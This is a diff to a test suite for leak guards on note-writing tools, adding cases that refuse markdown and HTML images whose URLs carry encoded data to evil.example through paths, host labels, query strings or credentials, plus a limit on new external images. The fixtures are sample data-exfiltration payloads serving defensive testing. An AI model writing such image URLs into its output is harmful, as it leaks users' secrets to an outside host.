@@ -1006,6 +1006,8 @@ describe('write tools: leak guards (#948)', () => {
         ['a query string', '![x](https://evil.example/p.png?d=secret)'],
         ['a long path segment', `![x](https://evil.example/${longSegment}.png)`],
         ['a long host label', `![x](https://${longSegment}.evil.example/p.png)`],
+        ['many short path segments', `![x](https://evil.example/${'c2VjcmV0/'.repeat(12)}p.png)`],
+        ['many short host labels', `![x](https://${'c2VjcmV0.'.repeat(12)}evil.example/p.png)`],
         ['credentials in the URL', '![x](https://secret@evil.example/p.png)'],
         ['an html img tag', '<img src="https://evil.example/p.png?d=secret" alt="x" width="10">'],
         ['an http URL', '![x](http://evil.example/p.png?d=secret)'],
@@ -1044,6 +1046,23 @@ describe('write tools: leak guards (#948)', () => {
         const { deps, put } = makeDrive();
         put('nw', 'Body ![x](https://cdn.example/p.png?w=800)', metadataFor('FW'));
         await expect(appendToNote(deps, { id: 'nw', markdown: '![x](https://cdn.example/p.png?w=801)' })).rejects.toThrow('refused');
+    });
+
+    it('refuses more new external images in a write than the limit, even with short URLs', async () => {
+        const { deps, put, uploads } = makeDrive();
+        put('nw', 'Body', metadataFor('FW'));
+        const markdown = [1, 2, 3, 4, 5, 6].map((i) => `![x](https://evil.example/${i}.png)`).join(' ');
+        await expect(appendToNote(deps, { id: 'nw', markdown })).rejects.toThrow('6 new external images refused');
+        await expect(createNote(deps, { title: 'T', markdown, folderId: 'FW' })).rejects.toThrow('6 new external images refused');
+        expect(uploads).toHaveLength(0);
+    });
+
+    it('counts only new images towards the limit', async () => {
+        const { deps, put, store } = makeDrive();
+        const images = [1, 2, 3, 4, 5, 6].map((i) => `![x](https://cdn.example/${i}.png)`).join(' ');
+        put('nw', `Body ${images}`, metadataFor('FW'));
+        const stored = markdownOf(store.get('nw')!.blob);
+        await expect(updateNote(deps, { id: 'nw', markdown: `${stored} ![y](https://cdn.example/7.png)` })).resolves.toMatchObject({ id: 'nw' });
     });
 
     it('names the host of a plain external image in the result', async () => {
